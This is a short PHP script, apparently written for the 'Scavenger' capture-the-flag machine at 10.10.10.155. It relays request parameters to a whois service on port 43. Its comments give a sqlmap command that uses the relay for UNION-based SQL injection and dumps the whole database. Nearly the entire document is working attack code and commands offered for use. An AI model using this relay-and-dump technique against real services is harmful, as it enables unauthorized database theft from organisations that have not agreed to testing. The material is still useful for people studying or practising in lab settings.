// This PHP script exploits the SQL Injection from Scavenger through the Whois service and dumps the database
//
// Run a PHP server locally: php -S 127.0.0.1:80
// Run SQLmap against the service: sqlmap --technique=U --dbms=mysql -u http://127.0.0.1/sqli_over_whois.php?cmd=test1 -p cmd --batch --dump

<?php

$addr = '10.10.10.155';
$port = 43;

$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$sockconnect = socket_connect($sock, $addr, $port);
// $req = urldecode($_REQUEST['cmd']);
$req = $_REQUEST['cmd'] . " \r\n";

socket_write($sock, $req, strlen($req));
echo socket_read($sock, 1024, PHP_BINARY_READ);

socket_close($sock);
?>
